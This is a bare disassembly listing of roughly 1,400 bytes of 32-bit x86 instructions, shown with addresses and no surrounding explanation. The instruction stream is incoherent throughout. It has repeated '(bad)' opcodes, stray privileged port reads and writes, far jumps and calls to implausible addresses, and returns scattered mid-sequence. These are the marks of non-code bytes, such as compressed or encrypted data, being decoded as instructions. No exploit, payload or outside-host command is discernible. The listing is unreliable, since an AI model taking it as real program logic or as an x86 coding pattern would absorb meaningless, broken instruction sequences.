  476fb8:	and    ebp,DWORD PTR [edx]
  476fba:	push   ss
  476fbb:	mov    DWORD PTR [eax+edx*1-0x4c9f929a],edx
  476fc2:	out    dx,al
  476fc3:	push   edi
  476fc4:	sbb    al,0x2c
  476fc6:	jo     0x47703e
  476fc8:	test   DWORD PTR [edi-0xf],edx
  476fcb:	or     eax,0x6b00de28
  476fd0:	add    al,BYTE PTR [eax+eiz*2+0x4735c392]
  476fd7:	outs   dx,BYTE PTR ds:[esi]
  476fd8:	cdq    
  476fd9:	inc    ebp
  476fda:	mov    eax,0x3e95dce7
  476fdf:	push   es
  476fe0:	sbb    ebx,DWORD PTR [eax+0x69fb60ac]
  476fe6:	lods   al,BYTE PTR ds:[esi]
  476fe7:	cmp    al,0x31
  476fe9:	mov    es,WORD PTR [ecx+0x59c9e49b]
  476fef:	retf   
  476ff0:	iret   
  476ff1:	popa   
  476ff2:	xchg   DWORD PTR [eax-0x124a3287],ebx
  476ff8:	or     DWORD PTR [ebx-0x2cfb7f35],edx
  476ffe:	adc    DWORD PTR [esi+eax*1],esp
  477001:	lahf   
  477002:	or     al,cl
  477004:	iret   
  477005:	mov    edi,eax
  477007:	pop    eax
  477008:	push   ebp
  477009:	in     eax,0xbb
  47700b:	pop    ebx
  47700c:	mov    DWORD PTR [edi+0x47],eax
  47700f:	add    cl,BYTE PTR [edi]
  477011:	mov    edi,0x13c705d2
  477016:	iret   
  477017:	add    ch,BYTE PTR [ebx-0x3a711e11]
  47701d:	dec    edi
  47701e:	push   esi
  47701f:	pop    eax
  477020:	shl    cl,cl
  477022:	push   cs
  477023:	out    dx,eax
  477024:	nop
  477025:	or     al,0xc0
  477027:	test   BYTE PTR [edi],dl
  477029:	jecxz  0x477077
  47702b:	jle    0x477039
  47702d:	xchg   BYTE PTR [ebp-0x3d8911ff],ch
  477033:	inc    eax
  477034:	outs   dx,BYTE PTR ds:[esi]
  477035:	and    edx,esp
  477037:	shl    DWORD PTR [ecx-0x6],1
  47703a:	push   ecx
  47703b:	(bad)  
  47703c:	mov    BYTE PTR [esi-0x80],dl
  47703f:	lahf   
  477040:	fmul   QWORD PTR [ebx+0xba7c1df]
  477046:	retf   0x6ce0
  477049:	test   DWORD PTR [edi+0x48dd830a],0xbd98845b
  477053:	mov    edi,0xc1f422df
  477058:	sbb    al,0x1b
  47705a:	lods   eax,DWORD PTR ds:[esi]
  47705b:	adc    ah,BYTE PTR ds:0xcb766766
  477061:	ds xchg esi,eax
  477063:	sbb    esp,DWORD PTR [ebp+eiz*1-0x37]
  477067:	push   eax
  477068:	adc    DWORD PTR [edi-0x18bd1d54],edx
  47706e:	cmp    bh,al
  477070:	in     eax,0xfd
  477072:	or     al,0xb2
  477074:	pop    ss
  477075:	xor    al,0x82
  477077:	lds    edx,FWORD PTR [ecx]
  477079:	lsl    ebx,WORD PTR [ecx-0x46]
  47707d:	ret    
  47707e:	leave  
  47707f:	sub    esi,DWORD PTR [edx-0x59]
  477082:	sbb    ecx,DWORD PTR [edi]
  477084:	sbb    DWORD PTR [edx+0x545ba7a7],edx
  47708a:	xchg   edi,eax
  47708b:	sub    al,0x9d
  47708d:	xchg   cl,dh
  47708f:	sub    eax,0x2371149c
  477094:	sub    esp,DWORD PTR [ebx]
  477096:	and    DWORD PTR [edi],edi
  477098:	xchg   DWORD PTR [edi],ecx
  47709a:	xlat   BYTE PTR ds:[ebx]
  47709b:	aaa    
  47709c:	int3   
  47709d:	push   ss
  47709e:	out    dx,al
  47709f:	pop    ss
  4770a0:	test   eax,0x3e0fdedc
  4770a5:	out    dx,eax
  4770a6:	ins    BYTE PTR es:[edi],dx
  4770a7:	xchg   ecx,eax
  4770a8:	adc    ch,BYTE PTR [ebx]
  4770aa:	jge    0x4770bb
  4770ac:	lock pop ebx
  4770ae:	fstp   QWORD PTR [edi+ebx*8]
  4770b1:	repnz adc DWORD PTR [ebx+0x2e],ebx
  4770b5:	sbb    ah,BYTE PTR [ecx+edi*2-0x14]
  4770b9:	cmp    eax,0x3262aa5b
  4770be:	ror    esp,0x16
  4770c1:	adc    eax,0x2640f20c
  4770c6:	dec    ecx
  4770c7:	retf   
  4770c8:	sbb    al,0xd3
  4770ca:	(bad)  
  4770cb:	dec    ecx
  4770cc:	ret    
  4770cd:	jecxz  0x477054
  4770cf:	sub    esp,esi
  4770d1:	mov    al,0x9
  4770d3:	mov    al,0xdc
  4770d5:	clc    
  4770d6:	scas   al,BYTE PTR es:[edi]
  4770d7:	mov    eax,ds:0x1b4669dc
  4770dc:	lgdtd  [ebp+0x2c]
  4770e0:	xlat   BYTE PTR ds:[ebx]
  4770e1:	ret    
  4770e2:	test   al,0x50
  4770e4:	ds icebp 
  4770e6:	in     eax,0xd1
  4770e8:	xor    DWORD PTR [ecx+0x5f],ebx
  4770eb:	test   BYTE PTR [edi+edx*1-0x2d],cl
  4770ef:	add    dh,BYTE PTR [ebp+0x22]
  4770f2:	jae    0x4770cd
  4770f4:	pushf  
  4770f5:	jns    0x47716d
  4770f7:	rcr    ch,1
  4770f9:	mov    esp,0xf07d2787
  4770fe:	jmp    0x26e33340
  477103:	pop    ebx
  477104:	pop    ebx
  477105:	mov    cl,0x8c
  477107:	xchg   ebx,eax
  477108:	xchg   ebx,eax
  477109:	loope  0x47716e
  47710b:	in     al,0x1d
  47710d:	push   cs
  47710e:	out    dx,eax
  47710f:	ror    DWORD PTR [eax],0xd
  477112:	jnp    0x47709a
  477114:	pop    ds
  477115:	and    bl,bh
  477117:	mov    ebx,DWORD PTR [edx]
  477119:	pop    edi
  47711a:	inc    esp
  47711b:	pop    ebp
  47711c:	jle    0x47712e
  47711e:	xchg   ebx,eax
  47711f:	popf   
  477120:	sbb    eax,0x375ea7be
  477125:	xchg   esp,eax
  477126:	add    al,0x10
  477128:	push   ss
  477129:	jge    0x477144
  47712b:	popa   
  47712c:	out    dx,al
  47712d:	gs iret 
  47712f:	inc    ecx
  477130:	sbb    DWORD PTR [eax+0x33899ac9],esi
  477136:	cdq    
  477137:	pop    eax
  477138:	(bad)  [ebx]
  47713a:	mov    ?,WORD PTR [ebx]
  47713c:	mov    eax,ds:0xb2056d9d
  477141:	arpl   WORD PTR [edi+0x2da4d02f],sp
  477147:	pop    edx
  477148:	sbb    DWORD PTR [edi+0x69],0xf230def1
  47714f:	jmp    0x6f293563
  477154:	imul   ebx,esi,0xffffff91
  477157:	pop    esi
  477158:	and    eax,0x3e2acd57
  47715d:	push   esi
  47715e:	add    eax,DWORD PTR [edi+0x761ce569]
  477164:	call   0xee31:0xfb3ea5ac
  47716b:	jmp    0x477192
  47716d:	push   esi
  47716e:	mov    eax,ds:0x57a55bb0
  477173:	mov    ds:0x6b60b90d,eax
  477178:	add    ebp,DWORD PTR [eax]
  47717a:	pop    ds
  47717b:	ss clc 
  47717d:	mov    ch,0x24
  47717f:	pop    edi
  477180:	outs   dx,BYTE PTR ds:[esi]
  477181:	mov    edi,0xe9413894
  477186:	add    edx,edi
  477188:	add    eax,0x7db80573
  47718d:	out    dx,eax
  47718e:	fmul   DWORD PTR [edx]
  477190:	xchg   edi,eax
  477191:	adc    al,0x3b
  477193:	xchg   edx,eax
  477194:	(bad)  
  477195:	rol    DWORD PTR [edx],1
  477197:	push   es
  477198:	mov    ebp,0x2dabacd8
  47719d:	and    al,0x62
  47719f:	popf   
  4771a0:	cld    
  4771a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4771a2:	sub    eax,0xec342bc4
  4771a7:	add    ah,BYTE PTR [edi]
  4771a9:	sti    
  4771aa:	adc    eax,0x90d8bdeb
  4771af:	gs cwde 
  4771b1:	cmp    al,BYTE PTR [eax+0x6b]
  4771b4:	add    edi,DWORD PTR [ecx]
  4771b6:	and    bh,BYTE PTR [ebx+0xb]
  4771b9:	xchg   DWORD PTR [esp+eax*4-0x67],edi
  4771bd:	mov    al,0x17
  4771bf:	or     ch,BYTE PTR [ebx+0x7c]
  4771c2:	jmp    0x28607be0
  4771c7:	je     0x4771b2
  4771c9:	enter  0xc915,0x23
  4771cd:	out    dx,al
  4771ce:	add    dh,bh
  4771d0:	and    al,0x87
  4771d2:	in     al,0x50
  4771d4:	out    dx,al
  4771d5:	add    dl,BYTE PTR [ebp+eiz*1-0x70]
  4771d9:	inc    ebx
  4771da:	and    DWORD PTR [edi-0x20],edx
  4771dd:	push   esp
  4771de:	and    eax,0xb18381c1
  4771e3:	pushf  
  4771e4:	or     ch,ch
  4771e6:	push   eax
  4771e7:	cmp    DWORD PTR [edx+eax*8-0x1119b90c],ecx
  4771ee:	cmp    eax,0x1130ab1b
  4771f3:	pop    ds
  4771f4:	imul   esi,DWORD PTR [ecx-0x2d],0x29
  4771f8:	bound  ebx,QWORD PTR [edx]
  4771fa:	aaa    
  4771fb:	xchg   edx,eax
  4771fc:	mov    edx,0x5890d16c
  477201:	xor    eax,0x4e0c8e10
  477206:	sub    BYTE PTR [esp+ebx*1],0x7d
  47720a:	xchg   edi,eax
  47720b:	push   esi
  47720c:	and    BYTE PTR [edi-0x6d4a0abe],ah
  477212:	add    esi,DWORD PTR [edx+0x4]
  477215:	rcl    BYTE PTR [esi+ebx*8+0x54],0xde
  47721a:	loop   0x477239
  47721c:	dec    eax
  47721d:	jbe    0x4771cc
  47721f:	pushf  
  477220:	jnp    0xd2763030
  477226:	cmp    eax,0x450f2429
  47722b:	push   0x60dfee0a
  477230:	out    0x92,al
  477232:	not    BYTE PTR [edx]
  477234:	sub    BYTE PTR [edx],al
  477236:	or     DWORD PTR [ecx+eax*2],eax
  477239:	cmp    dh,bh
  47723b:	xor    eax,0x48b475b
  477240:	daa    
  477241:	sbb    DWORD PTR [ecx],esp
  477243:	xchg   DWORD PTR [eax+ecx*8-0x53],ebx
  477247:	add    dh,bl
  477249:	cmp    ebx,DWORD PTR [edx+esi*8]
  47724c:	pop    esp
  47724d:	jb     0x477279
  47724f:	shl    ebx,1
  477251:	cld    
  477252:	mov    ah,BYTE PTR [ecx+ebx*8+0x96da485]
  477259:	inc    ebx
  47725a:	jb     0x477284
  47725c:	in     al,0x3
  47725e:	push   esp
  47725f:	add    al,0x54
  477261:	inc    edi
  477262:	repnz or dl,BYTE PTR [edx-0x1c0cab0d]
  477269:	pop    edx
  47726a:	enter  0x2440,0xe3
  47726e:	adc    ebp,DWORD PTR [edi]
  477270:	xor    BYTE PTR [ebx*2+0xd8b029c],al
  477277:	mov    cl,BYTE PTR [edx]
  477279:	sbb    DWORD PTR [eax],eax
  47727b:	or     al,0xf5
  47727d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47727e:	mov    bl,0xb1
  477280:	add    bl,BYTE PTR [ecx+0x446a3c4b]
  477286:	push   edi
  477287:	popa   
  477288:	outs   dx,BYTE PTR ds:[esi]
  477289:	pop    ebx
  47728a:	inc    edi
  47728b:	ss stos BYTE PTR es:[edi],al
  47728d:	pushf  
  47728e:	inc    edx
  47728f:	pop    ebp
  477290:	jo     0x4772b2
  477292:	dec    edx
  477293:	xchg   ecx,eax
  477294:	sub    bl,cl
  477296:	inc    eax
  477297:	aaa    
  477298:	add    DWORD PTR [edx],edi
  47729a:	enter  0x5d2,0xf1
  47729e:	adc    al,BYTE PTR [esi]
  4772a0:	or     DWORD PTR [ebp-0x25633876],edi
  4772a6:	or     esp,edx
  4772a8:	cmp    dh,BYTE PTR [eax+ecx*1-0x10]
  4772ac:	push   esp
  4772ad:	jae    0x477294
  4772af:	nop
  4772b0:	push   ecx
  4772b1:	(bad)  
  4772b2:	scas   eax,DWORD PTR es:[edi]
  4772b3:	je     0x4772d0
  4772b5:	cs xor eax,0x2c33d0ba
  4772bb:	dec    esp
  4772bc:	jae    0x4772f4
  4772be:	xor    dl,ah
  4772c0:	push   esp
  4772c1:	arpl   bp,sp
  4772c3:	mov    ecx,0xbe54d70f
  4772c8:	xchg   esi,eax
  4772c9:	mov    ebp,0xa37e0f3c
  4772ce:	arpl   cx,ax
  4772d0:	xchg   DWORD PTR ss:0x309c78a3,edi
  4772d7:	xchg   edx,eax
  4772d8:	pop    ebx
  4772d9:	rcr    BYTE PTR [ecx+0x3d02c2a7],cl
  4772df:	mov    BYTE PTR [eax],bl
  4772e1:	pop    ss
  4772e2:	sub    al,0x93
  4772e4:	xchg   ebx,eax
  4772e5:	pop    ss
  4772e6:	rcr    BYTE PTR [ebx+edx*4+0x28],cl
  4772ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4772eb:	dec    ebp
  4772ec:	nop
  4772ed:	out    0x92,al
  4772ef:	xchg   ebx,eax
  4772f0:	lahf   
  4772f1:	add    DWORD PTR [ebx-0x2db36e63],0xffffffb9
  4772f8:	scas   eax,DWORD PTR es:[edi]
  4772f9:	jb     0x47729e
  4772fb:	inc    esp
  4772fc:	jb     0x477322
  4772fe:	add    esp,DWORD PTR [ebx-0x6e36ef6d]
  477304:	or     al,0x93
  477306:	add    DWORD PTR [ebp-0x5a],0x17
  47730a:	xor    al,BYTE PTR [ebx-0x6d99d575]
  477310:	es stos DWORD PTR es:[edi],eax
  477312:	and    DWORD PTR [esi-0x7eb9a446],edx
  477318:	pushf  
  477319:	or     bh,BYTE PTR [ecx]
  47731b:	mov    bh,0x4a
  47731d:	push   ebp
  47731e:	pushf  
  47731f:	sub    ecx,0x43532958
  477325:	push   ebx
  477326:	and    eax,0x5381c93b
  47732b:	mov    al,ds:0x3c600f9c
  477330:	cmp    edx,DWORD PTR [esi]
  477332:	sbb    al,0x33
  477334:	cmc    
  477335:	cvtdq2ps xmm0,XMMWORD PTR ds:0x7ddf1546
  47733c:	mov    DWORD PTR [edi+0x6976e0fe],0xe1195b41
  477346:	ins    DWORD PTR es:[edi],dx
  477347:	mov    DWORD PTR [ebp-0x64],eax
  47734a:	or     eax,0x4be1d4b1
  47734f:	push   edi
  477350:	punpcklwd mm7,DWORD PTR [ebx+esi*8+0x4fb3a07b]
  477358:	lods   al,BYTE PTR ds:[esi]
  477359:	cwde   
  47735a:	sbb    eax,0xdc670d2d
  47735f:	and    edi,DWORD PTR [esi-0x239bc7da]
  477365:	push   ecx
  477366:	jb     0x4773ab
  477368:	and    ebx,edx
  47736a:	sbb    DWORD PTR [eax+0x1b4d4191],edx
  477370:	mov    cl,0xed
  477372:	xchg   ax,ax
  477374:	out    0x84,eax
  477376:	push   ebx
  477377:	(bad)
  47737b:	es out dx,eax
  47737d:	test   eax,0x5b5b9643
  477382:	mov    eax,ds:0x442624a7
  477387:	mov    ch,0x66
  477389:	nop
  47738a:	vpackuswb xmm4,xmm0,XMMWORD PTR [ebx]
  47738e:	cwde   
  47738f:	jnp    0x4773c7
  477391:	mov    bh,0x1d
  477393:	ficomp WORD PTR [ebx]
  477395:	enter  0xd233,0x2c
  477399:	pop    esp
  47739a:	xor    cl,al
  47739c:	repz or al,0x71
  47739f:	mov    ecx,0x3cf95521
  4773a4:	pop    ss
  4773a5:	xor    dh,BYTE PTR [ecx+0x61]
  4773a8:	ficomp DWORD PTR [ebx+0x6d]
  4773ab:	pop    ds
  4773ac:	xchg   ebx,eax
  4773ad:	and    DWORD PTR [ecx],edi
  4773af:	(bad)  
  4773b0:	adc    eax,0xc91c33d8
  4773b5:	inc    eax
  4773b6:	and    al,0x33
  4773b8:	adc    eax,0x91032160
  4773bd:	adc    eax,0x171feee3
  4773c2:	jae    0x47742b
  4773c4:	inc    edx
  4773c5:	or     ebp,esp
  4773c7:	pusha  
  4773c8:	inc    edx
  4773c9:	sbb    eax,DWORD PTR [esi]
  4773cb:	and    DWORD PTR [ecx],edi
  4773cd:	jmp    0x4773b8
  4773cf:	add    DWORD PTR [ecx],ebx
  4773d1:	cmp    al,0x86
  4773d3:	xor    eax,0x5a6d095b
  4773d8:	push   ebx
  4773d9:	and    DWORD PTR [edi-0x2e],eax
  4773dc:	fwait
  4773dd:	adc    eax,edi
  4773df:	jg     0x477377
  4773e1:	xchg   ebx,eax
  4773e2:	mov    DWORD PTR [eax-0xb680b22],edx
  4773e8:	xchg   ebx,eax
  4773e9:	popf   
  4773ea:	in     al,0x40
  4773ec:	hlt    
  4773ed:	int    0xec
  4773ef:	(bad)  
  4773f1:	xor    eax,ebp
  4773f3:	nop
  4773f4:	fwait
  4773f5:	pop    ss
  4773f6:	sbb    dh,BYTE PTR [ebp+eiz*8+0x16]
  4773fa:	icebp  
  4773fb:	inc    ecx
  4773fc:	push   ds
  4773fd:	clc    
  4773fe:	inc    esp
  4773ff:	adc    BYTE PTR [edx-0x1f],al
  477402:	pop    edi
  477403:	hlt    
  477404:	pop    es
  477405:	(bad)  
  477407:	outs   dx,BYTE PTR ds:[esi]
  477408:	pop    ecx
  477409:	fldenv [ebx+ecx*4-0x55]
  47740d:	popa   
  47740e:	out    0x1d,eax
  477410:	stc    
  477411:	dec    esi
  477412:	and    bh,0x5d
  477415:	je     0x47746e
  477417:	loope  0x477446
  477419:	pop    ss
  47741a:	(bad)  
  47741b:	ins    BYTE PTR es:[edi],dx
  47741c:	out    dx,eax
  47741d:	popf   
  47741e:	sub    ebp,DWORD PTR [eax+0x667c4b12]
  477424:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477425:	ret    
  477426:	mov    al,ds:0xb3e5d48e
  47742b:	adc    edx,DWORD PTR [ebx+0x19b27063]
  477431:	aam    0x4e
  477433:	(bad)  
  477434:	inc    esi
  477436:	fwait
  477437:	sbb    DWORD PTR [ebx-0x6401c577],edi
  47743d:	xchg   ebx,eax
  47743e:	jnp    0x477475
  477440:	je     0x47744f
  477442:	in     al,0xf9
  477444:	cs push ecx
  477446:	adc    eax,0x366e19dc
  47744b:	dec    ebx
  47744c:	and    dh,al
  47744e:	cmp    BYTE PTR [ebx],cl
  477450:	adc    eax,0x7a5c9e48
  477455:	push   cs
  477456:	shr    bl,1
  477458:	pop    ebp
  477459:	xor    ecx,esi
  47745b:	cs mov ebp,0x2d505ecb
  477461:	fmul   QWORD PTR [esi]
  477463:	fcmove st,st(0)
  477465:	pop    ebp
  477466:	repz imul ecx,DWORD PTR [edx+0x4e],0xac7dc2db
  47746e:	in     al,dx
  47746f:	cs fs in al,0x64
  477473:	or     ebx,DWORD PTR [ebp-0x11]
  477476:	ret    0x6fb1
  477479:	jb     0x47746d
  47747b:	jns    0x4774ce
  47747d:	jae    0x4774dc
  47747f:	push   esp
  477480:	xor    DWORD PTR [ebx],eax
  477482:	enter  0x9d21,0x5
  477486:	loop   0x47743c
  477488:	jb     0x4774a3
  47748a:	cmp    ecx,edi
  47748c:	cmp    al,0xf2
  47748e:	push   edi
  47748f:	pop    ebp
  477490:	xor    BYTE PTR [edx+0x64],dh
  477493:	nop
  477494:	outs   dx,DWORD PTR ds:[esi]
  477495:	add    BYTE PTR [edi+0x64],dl
  477498:	shl    DWORD PTR [edx-0x46fc5b47],0x51
  47749f:	xchg   esp,eax
  4774a0:	jmp    0xb422:0x648e4b4
  4774a7:	xchg   esp,eax
  4774a8:	jecxz  0x4774b2
  4774aa:	sbb    DWORD PTR [eax-0x4696d36c],ecx
  4774b0:	xchg   ebx,eax
  4774b1:	sbb    al,0x52
  4774b3:	in     eax,dx
  4774b4:	(bad)  
  4774b6:	lods   eax,DWORD PTR ds:[esi]
  4774b7:	or     esi,ecx
  4774b9:	or     BYTE PTR [edi-0x2a83e6c6],0xe9
  4774c0:	loope  0x4774ec
  4774c2:	sub    al,0x33
  4774c4:	out    0x1f,al
  4774c6:	adc    BYTE PTR [eax+0xc],dl
  4774c9:	sub    ah,ah
  4774cb:	dec    eax
  4774cc:	loop   0x4774e9
  4774ce:	and    bh,dl
  4774d0:	or     eax,0x32721079
  4774d5:	mov    esi,0x24ec6486
  4774da:	daa    
  4774db:	jmp    0x4774e6
  4774dd:	or     al,0x86
  4774df:	fs and esp,edi
  4774e2:	shld   DWORD PTR [edx],edi,0x8b
  4774e6:	xchg   ebp,eax
  4774e7:	or     al,0xa
  4774e9:	xchg   ebx,eax
  4774ea:	adc    eax,0x405b573a
  4774ef:	mov    edi,0x4447f669
  4774f4:	xchg   edx,eax
  4774f5:	add    ebx,DWORD PTR [ecx+0x4e]
  4774f8:	addr16 inc esp
  4774fa:	inc    esp
  4774fb:	or     edi,DWORD PTR [ecx+0x44806464]
  477501:	inc    esp
  477502:	add    bl,ah
  477504:	mov    eax,ds:0xda24e593
  477509:	add    eax,0x5937b264
  47750e:	repnz icebp 
  477510:	jle    0x25e5025f
  477516:	fs and al,0x2f
  477519:	rcr    DWORD PTR [ecx],cl
  47751b:	or     cl,BYTE PTR [eax]
  47751d:	or     esp,DWORD PTR [eax]
  47751f:	pusha  
  477520:	cmp    BYTE PTR [eax+edx*2-0x11],bl
  477524:	mov    al,0x37
  477526:	cmp    dl,BYTE PTR [ebp-0x4d8cd0ef]
  47752c:	cmp    BYTE PTR [ebx-0x3d],ch
  47752f:	xor    BYTE PTR [edx-0x15db79e9],dl
  477535:	push   ss
  477536:	repnz fs mov cs,ebp
  47753a:	cli    
  47753b:	loope  0x477502
  47753d:	pop    esp
  47753e:	push   esi
  47753f:	imul   ebp,DWORD PTR [edx+0x2e816843],0x8
  477546:	nop
  477547:	sbb    BYTE PTR [ebx],al
  477549:	mov    esi,ebx
  47754b:	in     al,0x1a
  47754d:	popf   
  47754e:	and    eax,0x6463be1
  477553:	stc    
  477554:	sahf   
  477555:	jno    0x4775d6
  477557:	and    edx,DWORD PTR [edi+eiz*2+0x679e41dc]
  47755e:	inc    eax
  47755f:	neg    DWORD PTR [eax-0x29c9fc62]
  477565:	shl    DWORD PTR [ecx+0x63f7a5e1],cl
  47756b:	sbb    ebp,DWORD PTR [esi+0x1b]
  47756e:	(bad)  
  47756f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477571:	iret   
  477572:	xchg   ebx,eax
  477573:	mov    BYTE PTR [edi-0x63],0xd7
  477577:	fcomi  st,st(1)
  477579:	sbb    esi,DWORD PTR [edi+ecx*8]
  47757c:	fs dec ebx
  47757e:	jle    0x47759b
  477580:	xchg   ebx,eax
  477581:	xchg   bh,ch
  477583:	pop    esp
  477584:	add    BYTE PTR [esi],ch
  477586:	test   DWORD PTR [edi+ecx*2],edi
  477589:	lods   al,BYTE PTR ds:[esi]
  47758b:	in     eax,dx
  47758c:	jg     0x47757f
  47758e:	add    BYTE PTR [edi+eiz*1],ah
  477591:	fwait
  477592:	iret   
  477593:	popa   
  477594:	adc    ch,ah
  477596:	out    0xed,al
  477598:	jmp    0x325fcf7a
  47759d:	jmp    0x5b575fe5
  4775a2:	nop
  4775a3:	out    0x91,al
  4775a5:	mov    ecx,0x616b2308
  4775aa:	in     al,dx
  4775ab:	imul   edi,DWORD PTR [ecx-0x62],0x81306403
  4775b2:	push   edi
  4775b3:	shl    DWORD PTR ds:0xa2064864,cl
  4775b9:	iret   
  4775ba:	cmp    ch,BYTE PTR [eax+0xb3782c7]
  4775c0:	pop    ebx
  4775c1:	dec    esp
  4775c2:	int    0xe1
  4775c4:	(bad)  
  4775c5:	mov    edx,0x9dbf725
  4775ca:	pop    eax
  4775cb:	push   cs
  4775cc:	out    dx,eax
  4775cd:	or     DWORD PTR ds:[ebx+edi*2+0x5],eax
  4775d2:	(bad)  
  4775d4:	int    0xd6
  4775d6:	sahf   
  4775d7:	pop    ss
  4775d8:	rcl    BYTE PTR [ebp+0x13],0x3b
  4775dc:	loopne 0x47756b
  4775de:	xchg   ebx,eax
  4775df:	sti    
  4775e0:	push   es
  4775e1:	iret   
  4775e2:	neg    BYTE PTR [edx]
  4775e4:	mov    ah,0xf
  4775e6:	add    BYTE PTR ds:0xda8f4807,dh
  4775ec:	add    BYTE PTR [ecx+0x6440020],0xd4
  4775f3:	pop    ebp
  4775f4:	(bad)  
  4775f5:	std    
  4775f6:	fnstsw WORD PTR [ebx+0x16026913]
  4775fc:	jmp    0x2126470f
  477601:	scas   eax,DWORD PTR es:[edi]
  477602:	je     0x4775d3
  477604:	or     edi,DWORD PTR [ecx+0x5]
  477607:	pop    ecx
  477608:	dec    esi
  477609:	xchg   bh,cl
  47760b:	xchg   edi,eax
  47760c:	add    BYTE PTR [esi+ecx*1],0xc5
  477610:	mov    ch,BYTE PTR [ebx+0xa]
  477613:	adc    bh,BYTE PTR [edx+0x75af7cb0]
  477619:	cmp    BYTE PTR [edi+eax*2],ah
  47761c:	xacquire xchg BYTE PTR [edi-0x1fe33624],ch
  477623:	sub    al,0xf3
  477625:	adc    BYTE PTR [edi-0x2fef02a0],al
  47762b:	push   es
  47762c:	rol    BYTE PTR [edi],0x48
  47762f:	jae    0x4775ef
  477631:	scas   al,BYTE PTR es:[edi]
  477632:	pmaxsw mm5,QWORD PTR [edi+0x351bfe8b]
  477639:	pop    ds
  47763a:	inc    esp
  47763b:	sar    DWORD PTR [edi-0x2c],0x3
  47763f:	imul   eax,DWORD PTR [ecx+0x50],0xffffff81
  477643:	(bad)  
  477644:	gs aam 0xbf
  477647:	jnp    0x4775ea
  477649:	push   eax
  47764a:	jno    0x477651
  47764c:	add    bh,BYTE PTR [edi+0x6b]
  47764f:	stos   DWORD PTR es:[edi],eax
  477650:	outs   dx,BYTE PTR ds:[esi]
  477651:	mov    fs,WORD PTR [esi]
  477653:	ss test eax,0xdab7e436
  477659:	mov    esi,0x9351592e
  47765e:	lock dec eax
  477660:	in     eax,0xc
  477662:	push   0x42
  477664:	cmp    eax,0xb42c30c9
  477669:	sar    edx,1
  47766b:	xor    BYTE PTR [eax],ch
  47766d:	push   ebx
  47766e:	xor    eax,0x9190efce
  477673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  477674:	into   
  477675:	cmp    eax,0x22126669
  47767a:	out    dx,al
  47767b:	mov    WORD PTR [ebx+0x74],ds
  47767e:	aas    
  47767f:	adc    BYTE PTR [ebx+0x4e],ch
  477682:	dec    eax
  477683:	xor    BYTE PTR ds:0x13b4e5ed,dh
  477689:	neg    eax
  47768b:	pusha  
  47768c:	iret   
  47768d:	dec    ebp
  47768e:	pop    edi
  47768f:	jne    0x4776a5
  477691:	push   ecx
  477692:	or     BYTE PTR [ebp+0x23b0e0d],dh
  477698:	ja     0x47767b
  47769a:	shl    ebp,0x5
  47769d:	stc    
  47769e:	jne    0x4776c8
  4776a0:	pop    ds
  4776a1:	adc    al,dl
  4776a3:	and    dh,bh
  4776a5:	or     eax,0x3e0ea35b
  4776aa:	dec    edx
  4776ab:	push   cs
  4776ac:	mov    dl,0x84
  4776ae:	sbb    DWORD PTR [ecx+edx*4-0x46d5c6d9],0xdd7d0e91
  4776b9:	jae    0x47773a
  4776bb:	sub    eax,0xb03a1e25
  4776c0:	pop    ebx
  4776c1:	das    
  4776c2:	sbb    cl,BYTE PTR [ebx]
  4776c4:	dec    eax
  4776c5:	dec    esi
  4776c6:	inc    ecx
  4776c7:	ror    BYTE PTR [ebp+0x75],cl
  4776ca:	dec    eax
  4776cb:	fcomp  DWORD PTR [ebx+0x41]
  4776ce:	jb     0x477745
  4776d0:	sub    BYTE PTR [ebx+0x7c],ch
  4776d3:	in     al,0x15
  4776d5:	and    al,0x5d
  4776d7:	push   cs
  4776d8:	dec    ebp
  4776d9:	jne    0x4776e9
  4776db:	push   es
  4776dc:	mov    ebx,DWORD PTR [ebx]
  4776de:	sub    al,0xfc
  4776e0:	outs   dx,BYTE PTR ss:[esi]
  4776e2:	outs   dx,DWORD PTR ds:[esi]
  4776e3:	pop    ebp
  4776e4:	jb     0x477710
  4776e6:	in     al,0x48
  4776e8:	out    0x84,eax
  4776ea:	inc    esi
  4776eb:	and    eax,0x9c10790f
  4776f0:	test   al,0x9c
  4776f2:	test   al,0x4d
  4776f4:	cld    
  4776f5:	jmp    0x1b5f:0x4d3a7781
  4776fc:	fstp   QWORD PTR [ebp+ebx*2-0x576dafc2]
  477703:	lods   eax,DWORD PTR ds:[esi]
  477704:	pushf  
  477705:	(bad)  
  477706:	and    ch,BYTE PTR [ebx-0x4e]
  477709:	and    DWORD PTR [esi],edi
  47770b:	pop    ss
  47770c:	dec    ecx
  47770d:	push   ds
  47770e:	icebp  
  47770f:	jecxz  0x4776fe
  477711:	push   0x37bd9dfa
  477716:	xchg   ebx,eax
  477717:	xor    eax,0x256e1b20
  47771c:	pushf  
  47771d:	dec    edi
  47771e:	pop    eax
  47771f:	jae    0x477757
  477721:	mov    al,0x3c
  477723:	inc    edx
  477724:	outs   dx,DWORD PTR ds:[esi]
  477725:	aaa    
  477726:	sbb    al,0xf3
  477728:	sbb    esp,esp
  47772a:	ins    BYTE PTR es:[edi],dx
  47772b:	inc    edx
  47772c:	fld    st(7)
  47772e:	js     0x477752
  477730:	mov    ebx,0xc92cf26e
  477735:	outs   dx,DWORD PTR ds:[esi]
  477736:	or     bl,ah
  477738:	out    0x4,al
  47773a:	and    eax,0x2f88c3df
  47773f:	clc    
  477740:	(bad)  [ebx+0x2a]
  477743:	das    
  477744:	push   esi
  477745:	xchg   DWORD PTR [ebp-0x44],edx
  477748:	or     dl,BYTE PTR [edx]
  47774a:	mov    dh,0x2e
  47774c:	call   0xfc69d2d6
  477751:	fwait
  477752:	and    eax,0x963c9110
  477757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  477758:	stos   DWORD PTR es:[edi],eax
  477759:	sbb    BYTE PTR [ebx+0x21914b93],bl
  47775f:	stc    
  477760:	enter  0xdb1a,0x93
  477764:	rcr    DWORD PTR [ebx],0xe9
  477767:	in     al,0x22
  477769:	mov    fs,esp
  47776b:	push   ds
  47776c:	xchg   ebx,eax
  47776d:	mov    ds:0xb1e45273,al
  477772:	and    edi,ebx
  477774:	jl     0x477709
  477776:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  477777:	sbb    ah,BYTE PTR ds:0xd093664c
